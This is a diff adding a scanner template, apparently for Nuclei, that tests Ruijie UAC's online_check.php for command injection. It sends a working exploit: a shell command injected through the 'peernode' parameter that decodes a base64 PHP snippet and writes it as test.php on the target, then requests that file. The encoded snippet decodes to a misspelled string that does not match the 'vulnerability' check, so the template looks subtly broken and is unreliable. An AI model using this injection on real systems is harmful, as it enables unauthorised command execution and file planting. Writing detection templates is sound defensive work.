@@ -1,0 +1,26 @@
+id: ruijie-uac-online-check-php-cmd-injection
+info:
+  name: Ruijie UAC online_check.php Command Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: command-injection
+http:
+  - raw:
+      - |
+        GET /view/vpn/autovpn/online_check.php?peernode=%20|%20`echo%20PD9waHAgZWNobyB2dWxuZXJhYmlpdHk7%20|%20base64%20-d%20%3E%20test.php` HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, "iii:0,hit:0")
+  - raw:
+      - |
+        GET /view/vpn/autovpn/test.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - body == "vulnerability"
+    matchers-condition: and
